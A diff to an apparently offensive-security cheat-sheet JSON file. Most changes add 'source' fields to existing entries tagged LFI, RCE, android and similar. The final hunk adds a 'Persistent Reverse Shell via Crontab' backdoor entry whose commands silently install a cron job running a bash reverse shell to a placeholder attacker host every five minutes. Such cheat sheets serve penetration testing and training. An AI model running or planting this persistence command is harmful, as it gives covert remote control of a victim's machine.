@@ -39,6 +39,7 @@
       "LFI",
       "RCE"
     ],
+    "source": [],
     "data": [
       {
         "description": "",
@@ -60,6 +61,7 @@
       "PHP",
       "MySQL"
     ],
+    "source": [],
     "data": [
       {
         "description": "",
@@ -76,6 +78,7 @@
       "zip",
       "crypto"
     ],
+    "source": [],
     "data": [
       {
         "description": "",
@@ -91,6 +94,7 @@
       "rev",
       ".NET"
     ],
+    "source": [],
     "data": [
       {
         "description": "First download both to /opt:",
@@ -112,6 +116,7 @@
       "android",
       "bash"
     ],
+    "source": [],
     "data": [
       {
         "description": "Usage: logcat com.example.app",
@@ -129,6 +134,7 @@
       "android",
       "bypass"
     ],
+    "source": [],
     "data": [
       {
         "description": "Substitute <com.example.app>:",
@@ -176,6 +182,7 @@
       "bash",
       "bug bounty"
     ],
+    "source": [],
     "data": [
       {
         "description": "",
@@ -192,6 +199,7 @@
       "android",
       "bash"
     ],
+    "source": [],
     "data": [
       {
         "description": "First download both to /opt:",
@@ -240,6 +248,7 @@
       "bash",
       "apk"
     ],
+    "source": [],
     "data": [
       {
         "description": "Usage: pull-apk <package id>:",
@@ -254,6 +263,7 @@
     "tags": [
       "misc"
     ],
+    "source": [],
     "data": [
       {
         "description": "Substitute <file>:",
@@ -269,6 +279,7 @@
       "linux",
       "forensics"
     ],
+    "source": [],
     "data": [
       {
         "description": "",
@@ -285,6 +296,7 @@
       "osint",
       "misc"
     ],
+    "source": [],
     "data": [
       {
         "description": "Substitute <IP ADDRESS>:",
@@ -319,6 +331,7 @@
       "RCE",
       "bypass"
     ],
+    "source": [],
     "data": [
       {
         "description": "Alternative PHP extensions:",
@@ -346,6 +359,9 @@
       "misc",
       "bash"
     ],
+    "source": [
+      "https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump"
+    ],
     "data": [
       {
         "description": "",
@@ -363,6 +379,7 @@
       "misc",
       "enum"
     ],
+    "source": [],
     "data": [
       {
         "description": "Substitute <URL>:",
@@ -378,6 +395,7 @@
       "linux",
       "misc"
     ],
+    "source": [],
     "data": [
       {
         "description": "List files with activated SUID bit",
@@ -398,6 +416,7 @@
       "crypto",
       "misc"
     ],
+    "source": [],
     "data": [
       {
         "description": "Encrypt (substitute <FILE>):",
@@ -418,6 +437,7 @@
       "enum",
       "android"
     ],
+    "source": [],
     "data": [
       {
         "description": "Substitute <app.apk>:",
@@ -428,6 +448,35 @@
         "description": "Other method:",
         "language": "bash",
         "command": "# Download https://github.com/n0mi1k/apk2url (also download required dependencies)\n./apk2url.sh <app.apk>"
+      }
+    ]
+  },
+  {
+    "title": "Persistent Reverse Shell via Crontab",
+    "description": "",
+    "tags": [
+      "linux",
+      "bash",
+      "backdoor"
+    ],
+    "source": [
+      "https://gist.github.com/hoefler02/2ca8166c167f147c8fb076b48eb7cb47"
+    ],
+    "data": [
+      {
+        "description": "Overwrites existing crontabs:",
+        "language": "bash",
+        "command": "(touch .tab ; echo \"* * * * * <reverse-shell-of-choice>\" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"
+      },
+      {
+        "description": "Keeps existing crontabs:",
+        "language": "bash",
+        "command": "(crontab -l > .tab ; echo \"* * * * * <reverse-shell-of-choice>\" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"
+      },
+      {
+        "description": "Example sending bash reverse shell every 5 min:",
+        "language": "bash",
+        "command": "(touch .tab ; echo \"*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/attacker/port 0>&1'\" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"
       }
     ]
   }
